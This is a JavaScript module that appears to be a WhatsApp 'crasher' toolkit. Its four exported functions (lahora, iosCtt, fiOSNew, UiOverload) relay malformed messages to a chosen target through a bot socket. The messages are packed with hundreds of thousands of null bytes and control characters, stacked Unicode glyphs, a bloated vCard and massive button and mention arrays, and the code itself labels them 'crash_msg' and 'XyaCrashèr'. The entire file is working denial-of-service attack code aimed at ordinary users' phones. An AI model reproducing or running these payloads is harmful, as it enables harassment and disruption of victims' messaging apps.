import { sleep } from "./helpers.js";

export async function lahora(sock, target) {
  try {
    const msg1 = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: { text: "izin @mexxreall" },
            nativeFlowMessage: { buttons: "\0".repeat(250000) },
          },
        },
      },
    };

    const msg2 = {
      interactiveMessage: {
        body: { text: "izin @mexxreall" },
        nativeFlowMessage: {
          buttons:
            "crash_msg" +
            "\0".repeat(20000) +
            "\u0000".repeat(1000) +
            "\u0000".repeat(30000) +
            "\u0000".repeat(4000),
        },
      },
    };

    const msg3 = {
      interactiveMessage: {
        body: { text: "meta ai" },
        nativeFlowMessage: {
          buttons: {
            name: "meta_mesaage",
            buttonParamsJson:
              "\0".repeat(20000) + "\u0000".repeat(1000) + "\u0000".repeat(4000),
          },
        },
      },
    };

    const msg4 = {
      interactiveMessage: {
        body: { text: "izin @mexxreall".repeat(20000) },
        nativeFlowMessage: { buttons: "[".repeat(50001) },
        contextInfo: {
          mentionedJid: [target],
          isForwarded: true,
          forwardingScore: 999,
        },
      },
    };

    await sock.relayMessage(target, msg1, { viewOnce: true });
    await sock.relayMessage(target, msg2, {});
    await sock.relayMessage(target, msg3, {});
    await sock.relayMessage(target, msg4, {});

    await sock.relayMessage(
      target,
      {
        groupStatusMessageV2: {
          message: {
            interactiveResponseMessage: {
              body: {
                text: "\x10".repeat(500000),
                title: "\r".repeat(2000),
                format: "DEFAULT",
              },
              nativeFlowResponseMessage: {
                buttons: Array.from({ length: 500000 }, () => ({})),
              },
              contextInfo: {
                mentionedJid: [
                  "0@s.whatsapp.net",
                  ...Array.from({ length: 1999 }, () =>
                    `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`,
                  ),
                ],
              },
              viewOnceMessage: {
                message: { text: "\u0000".repeat(50000) },
              },
            },
          },
        },
      },
      {},
    );
  } catch (e) {
    throw new Error(e?.message || "lahora gagal");
  }
}

export async function iosCtt(sock, target) {
  await sock.relayMessage(
    target,
    {
      contactMessage: {
        displayName: "- # XyaCrashèr ん. " + "𑇂𑆵𑆴𑆿".repeat(10000),
        vcard: `BEGIN:VCARD
VERSION:3.0
N:;𑇂𑆵𑆴𑆿${"𑇂𑆵𑆴𑆿".repeat(10000)};;;
FN:𑇂𑆵𑆴𑆿${"𑇂𑆵𑆴𑆿".repeat(10000)}
NICKNAME:𑇂𑆵𑆴𑆿${"ᩫᩫ".repeat(4000)}
ORG:𑇂𑆵𑆴𑆿${"ᩫᩫ".repeat(4000)}
TITLE:𑇂𑆵𑆴𑆿${"ᩫᩫ".repeat(4000)}
item1.TEL;waid=6287873499996:+62 878-7349-9996
item1.X-ABLabel:Telepon
item2.EMAIL;type=INTERNET:𑇂𑆵𑆴𑆿${"ᩫᩫ".repeat(4000)}
item2.X-ABLabel:Kantor
item3.EMAIL;type=INTERNET:𑇂𑆵𑆴𑆿${"ᩫᩫ".repeat(4000)}
item3.X-ABLabel:Kantor
item4.EMAIL;type=INTERNET:𑇂𑆵𑆴𑆿${"ᩫᩫ".repeat(4000)}
item4.X-ABLabel:Pribadi
item5.ADR:;;𑇂𑆵𑆴𑆿${"ᩫᩫ".repeat(4000)};;;;
item5.X-ABADR:ac
item5.X-ABLabel:Rumah
X-YAHOO;type=KANTOR:𑇂𑆵𑆴𑆿${"ᩫᩫ".repeat(4000)}
PHOTO;${null}
X-WA-BIZ-NAME:𑇂𑆵𑆴𑆿${"ᩫᩫ".repeat(4000)}
END:VCARD`,
        contextInfo: {
          externalAdReply: {
            automatedGreetingMessageShown: true,
            automatedGreetingMessageCtaType: "\u0000".repeat(100000),
            greetingMessageBody: "- # XyaCrashèr ん.",
          },
        },
      },
    },
    { participant: true },
  );
}

export async function fiOSNew(sock, target, count = 1) {
  for (let z = 0; z < count; z++) {
    await sock.relayMessage(
      target,
      {
        viewOnceMessage: {
          message: {
            buttonsMessage: {
              locationMessage: {
                degreesLongitude: 0,
                degreesLatitude: 0,
                name: "𑇂𑆵𑆴𑆿".repeat(9000),
              },
              contentText: "izin @mexxreall",
              buttons: [
                {
                  buttonId: "izin @mexxreall",
                  buttonText: { displayText: "𑇂𑆵𑆴𑆿".repeat(1000) },
                  type: 1,
                },
              ],
              headerType: 6,
            },
          },
        },
      },
      { isSecret: true },
    );
    await sleep(1000);
  }
}

export async function UiOverload(sock, target) {
  await sock.relayMessage(
    target,
    {
      extendedTextMessage: {
        text: "ꦾ".repeat(120000) + "@1".repeat(20000),
        contextInfo: {
          stanzaId: target,
          participant: target,
          quotedMessage: {
            conversation: "霊 izin @mexxreall" + "ꦾ".repeat(120000) + "@1".repeat(20000),
          },
          disappearingMode: {
            initiator: "CHANGED_IN_CHAT",
            trigger: "CHAT_SETTING",
          },
        },
        inviteLinkGroupTypeV2: "DEFAULT",
      },
    },
    { participant: { jid: target } },
  );
}
